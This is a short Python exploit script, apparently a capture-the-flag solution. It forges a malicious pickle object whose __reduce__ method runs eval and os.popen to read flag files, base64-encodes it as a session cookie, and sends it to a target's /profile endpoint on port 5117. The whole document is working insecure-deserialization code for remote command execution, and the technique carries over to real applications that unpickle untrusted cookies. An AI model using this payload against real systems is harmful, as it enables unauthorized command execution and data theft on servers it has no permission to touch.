import base64
import pickle
import urllib.request
import sys

class E:
    def __reduce__(self):
        cmd = "__import__('os').popen('cat /flag.txt /flag /app/flag* 2>/dev/null').read()"
        return (eval, ('{"user": ' + cmd + ', "role": "admin"}',))

cookie = base64.b64encode(pickle.dumps(E())).decode()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        url = f"http://{sys.argv[1]}:5117/profile"
        req = urllib.request.Request(url, headers={"Cookie": f"session={cookie}"})
        print(urllib.request.urlopen(req).read().decode())
    else:
        print(cookie)
